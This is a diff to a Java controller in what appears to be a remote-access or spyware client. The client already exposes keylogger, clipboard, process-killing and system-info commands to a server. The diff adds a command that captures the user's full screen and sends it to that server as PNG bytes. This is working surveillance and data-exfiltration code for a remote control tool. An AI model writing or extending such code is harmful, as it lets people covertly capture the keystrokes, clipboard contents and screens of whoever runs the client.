@@ -37,6 +37,7 @@ public class Controller {
         put(COMMAND_CLIENT_SYSTEM_INFO, Controller::getClientSystemInfo);
         put(COMMAND_CLIENT_SYSTEM_USAGE, Controller::getClientSystemUsage);
         put(COMMAND_CLIENT_MONITOR, Controller::getClientMonitor);
+        put(COMMAND_CLIENT_SCREENSHOT, Controller::getScreenshot);
         put(COMMAND_CLIENT_CLIPBOARD, Controller::getClipboard);
         put(COMMAND_END_CLIENT_PROCESS, Controller::endProcess);
         put(COMMAND_CLIENT_KEYLOGGER, Controller::getKeylogger);
@@ -74,6 +75,22 @@ public class Controller {
 
     private static String getKeylogger(JSON input) {
         return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_CLIENT_KEYLOGGER).put("keylogger", KeyLogger.getLog()).json();
+    }
+
+    private static String getScreenshot(JSON input) {
+        try {
+            BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
+            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+            ImageIO.write(image, "png", byteArrayOutputStream);
+            byte[] tmp = byteArrayOutputStream.toByteArray();
+            return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST)
+                    .put(COMMAND, COMMAND_CLIENT_SCREENSHOT)
+                    .put("image", new JSONArray(tmp))
+                    .put("length", tmp.length)
+                    .json();
+        } catch (Exception e) {
+            throw new RuntimeException(e);
+        }
     }
 
     private static String getClipboard(JSON input) {
